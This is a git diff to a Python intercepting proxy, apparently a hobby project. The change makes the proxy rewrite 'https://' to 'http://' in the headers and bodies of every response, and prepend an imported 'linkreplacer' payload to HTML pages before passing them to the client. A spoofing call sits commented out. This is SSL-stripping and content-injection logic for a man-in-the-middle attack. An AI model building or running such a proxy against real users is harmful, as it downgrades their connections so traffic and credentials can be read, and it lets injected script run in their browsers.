@@ -1,5 +1,6 @@
 from network.endpoint import Client, Server
 from utils.debug_save import debug_save
+from utils.linkreplacer import linkreplacer
 
 import threading
 import socket
@@ -39,8 +40,11 @@ class Proxy:
                 res = server.recv()
                 debug_save(res.body.plain_text, "ServerRecv")
             res.header_replace(b"https://", b"http://")
-            if res.header.get(b"Content-Type").split(b";")[0].strip() in [b'text/html', b'application/javascript']:
-                res.body_replace(b"https://", b"http://")
+            content_type = res.header.get(b"Content-Type").split(b";")[0].strip()
+            # if content_type in [b'text/html', b'application/javascript']: #이거 조건문 하면 안되나. 안될거같은걸? 그치?
+            res.body_replace(b"https://", b"http://")
+            if content_type in [b'text/html'] and is_dochtml(res.body):
+                res.body = linkreplacer + res.body
             debug_save(res.body.plain_text, "after_replace")
             client.send(res)
 
@@ -55,6 +59,10 @@ class Proxy:
                 # self.spoof(client)
         except KeyboardInterrupt:
             print("[SHUTDOWN]")
+
+
+def is_dochtml(body: bytes) -> bool:
+    return body.startswith(b"<!DOCTYPE")
 
 
 
